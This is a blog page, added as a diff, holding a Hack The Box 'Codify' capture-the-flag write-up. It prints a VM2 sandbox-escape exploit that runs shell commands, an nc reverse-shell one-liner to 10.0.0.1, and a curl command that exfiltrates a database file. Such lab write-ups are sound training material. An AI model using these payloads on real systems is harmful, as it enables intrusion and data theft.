@@ -1,0 +1,268 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=2, user-scalable=no"
+    />
+    <meta
+      name="description"
+      content="Semantic-UI-Forest, collection of design, themes and templates for Semantic-UI."
+    />
+    <meta name="keywords" content="Semantic-UI, Theme, Design, Template" />
+    <meta name="author" content="PPType" />
+    <meta name="theme-color" content="#ffffff" />
+    <title>Off-canvas Template for Semantic-UI</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.min.css"
+      type="text/css"
+    />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/styles/agate.min.css">
+
+    <style type="text/css">
+      body {
+        padding-top: 56px;
+        -webkit-font-smoothing: antialiased;
+        -moz-font-smoothing: grayscale;
+      }
+
+      .ui.grid {
+        margin-top: 0 !important;
+      }
+
+      .ui.vertical.menu {
+        width: auto;
+      }
+
+      .ui.right.sidebar.vertical.menu {
+        width: 15rem;
+      }
+
+      .three.wide.column > .ui.vertical.menu > a.item.active,
+      .ui.right.sidebar.vertical.menu > a.item.active,
+      .three.wide.column > .ui.vertical.menu > a.item.active:hover,
+      .ui.right.sidebar.vertical.menu > a.item.active:hover {
+        background-color: #337ab7;
+        color: white;
+        border: none !important;
+      }
+
+      .three.wide.column > .ui.vertical.menu > a.item:hover,
+      .ui.right.sidebar.vertical.menu > a.item:hover {
+        background-color: #f5f5f5;
+      }
+
+      .ui.fixed.borderless.menu {
+        padding: 0;
+        flex-wrap: wrap;
+      }
+
+      .ui.fixed.borderless.menu .row > a.header.item {
+        font-size: 1.2rem;
+      }
+
+      .ui.message {
+        background-color: rgba(238, 238, 238);
+        box-shadow: none;
+        padding: 5rem 4rem;
+      }
+
+      .ui.message h1.ui.header {
+        font-size: 4.5rem;
+      }
+
+      .ui.message p.lead {
+        font-size: 1.3rem;
+        color: #333333;
+        line-height: 1.4;
+        font-weight: 300;
+      }
+
+      @media only screen and (max-width: 767px) {
+        .ui.message h1.ui.header {
+          font-size: 2rem;
+        }
+      }
+
+      button.ui.top.right.attached.button {
+        position: absolute;
+        top: 0;
+        right: 0;
+        border-bottom-right-radius: 0;
+        padding-right: 0.75rem;
+      }
+
+      .pushable {
+        height: unset;
+        overflow-x: visible;
+      }
+
+      .ui.right.sidebar {
+        height: auto !important;
+        margin-top: 1rem !important;
+        padding-left: 0;
+        padding-right: 0;
+      }
+
+      footer {
+        padding: 24px 0;
+      }
+    </style>
+  </head>
+
+  <body id="root">
+
+    <div class="ui borderless blue inverted menu">
+    <div class="ui container">
+        <a class="header active item" href="#root">Home</a>
+        
+        
+            <a class="item" href="#technology">Technology</a>
+        
+            <a class="item" href="#robotics">Robotics</a>
+        
+            <a class="item" href="#programming">Programming</a>
+        
+            <a class="item" href="#projects">Projects</a>
+        
+            <a class="item" href="#miscellaneous">Miscellaneous</a>
+        
+        
+        <a class="item" href="#root">About</a>
+    </div>
+</div>
+
+        <style>
+            .content p img {
+                width: 300px;
+                border-radius: 10px;
+            }
+        </style>
+        <div class="ui grid stackable container">
+            <div class="row" id="page-header">
+                <div class="ui basic segment">
+                    <h1 class="ui huge header">
+                        <div class="content">Hack The Box Codify Write Up</div>
+                        <div class="sub header">
+                            
+                        </div>
+                    </h1>
+                </div>
+            </div>
+            <div class="row" id="article">
+                <div class="eleven wide column content">
+                    <h2 class="ui large header">
+                        <div class="content">Write up for Codify machine on Hack the box</div>
+                        <div class="sub header">
+                            Sat Mar 23 2024 00:00:00 GMT+0000 (Coordinated Universal Time) by <a href="#root">Leon</a>
+                        </div>
+                    </h2>
+                    <div class="ui hidden divider "></div>
+                    <p>Port Enumeration:</p>
+<p>We conducted a port scan to assess the available ports on the target IP using the following command:</p>
+<pre><code>bash
+</code></pre>
+<pre><code>nmap -p- --min-rate 5000 $TARGET -sV 
+</code></pre>
+<p>The scan results unveiled several open ports:</p>
+<ul>
+<li><p>Port 22/tcp: Open, hosting an SSH service.</p>
+</li>
+<li><p>Port 80/tcp: Open, serving HTTP.</p>
+</li>
+<li><p>Port 8888/tcp: Open, possibly related to the Sun AnswerBook service.</p>
+</li>
+</ul>
+<p>These findings suggest potential points of entry into the system, with SSH, HTTP, and a less common port being accessible.</p>
+<p>Web Enumeration:</p>
+<p>Upon accessing the web server on port 80, we were redirected to &quot;codify.htb&quot;. To ease further access, we added the domain to our &#39;etc/hosts&#39; file.</p>
+<p>Further investigation of the web server yielded limited results. Despite attempts with basic reverse shells and testing in code editors, we encountered challenges in making significant progress. Examination of the source code and directory paths via DirBuster confirmed the absence of additional accessible pages beyond the visible content.</p>
+<p>During this exploration, we noted the utilization of VM2 for the code sandbox, suggesting potential avenues for exploitation.</p>
+<p>Exploitation Discovery:</p>
+<p>Research into known vulnerabilities for the Node.js library led to a post on GitHub (<a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</a>) detailing a vulnerability in the <code>handleException()</code> function. This vulnerability enables escaping the sandbox and executing arbitrary code for VM2 versions up to 3.9.16.</p>
+<p>The vulnerable code snippet is as follows:</p>
+<pre><code>javascript
+</code></pre>
+<pre><code>const {VM} = require(&quot;vm2&quot;);
+const vm = new VM();
+const code =  err = {};
+const handler = {
+   getPrototypeOf(target) {
+       (function stack() {
+           new Error().stack;
+           stack();
+       })();
+   }
+};
+const proxiedErr = new Proxy(err, handler);
+try {
+   throw proxiedErr;
+} catch ({constructor: c}) {
+   c.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;YOUR BASH COMMAND&#39;);
+}
+console.log(vm.run(code));
+</code></pre>
+<p>Executing a bash command such as <code>ls</code> or <code>whoami</code> confirms the functionality of the code.</p>
+<p>Now, it&#39;s time for Remote Code Execution (RCE)! I utilized the following payload for this purpose:</p>
+<pre><code>bash
+</code></pre>
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 443 &gt;/tmp/f
+</code></pre>
+<p>This payload establishes a reverse shell to 10.0.0.1 on port 443.</p>
+<p>Additionally, we discovered a database file located at <code>/var/www/contacts/tickets.db</code>. To exfiltrate the file, we utilized the following method:</p>
+<pre><code>bash
+</code></pre>
+<pre><code># Listen to files
+python3 -m pip install --user uploadserver
+python3 -m uploadserver
+
+# Send a file
+curl -X POST http://HOST/upload -F &#39;files=@tickets.db&#39; 
+</code></pre>
+<p>This process enables the transfer of the database file for further analysis and exploitation.</p>
+
+                </div>
+                <div class="four wide right floated column">
+                    <div class="ui secondary segment">
+                        <h4 class="ui header">About</h4>
+                        <p>
+                            Etiam porta <i>sem malesuada magna mollis euismod</i>. Cras mattis
+                            consectetur purus sit amet fermentum. Aenean lacinia bibendum
+                            nulla sed consectetur.
+                        </p>
+                    </div>
+                    <h4 class="ui header">Archives</h4>
+                    <div class="ui list">
+         
+                    </div>
+                    
+                    <h4 class="ui header">Elsewhere</h4>
+                    <div class="ui list">
+                        <a class="item">GitHub</a> <a class="item">Twitter</a>
+                        <a class="item">Facebook</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <footer class="ui secondary segment">
+            <div class="ui center aligned container">
+                <p>
+                    Blog template built for Semantic-UI by
+                    <a href="https://semantic-ui-forest.com">@Semantic-UI-Forest</a>.
+                </p>
+                <a href="#root">Back to top</a>
+            </div>
+
+
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+
+<!-- and it's easy to individually load additional languages -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/go.min.js"></script>
+
+<script>hljs.highlightAll();</script>
+</body>
+</html>
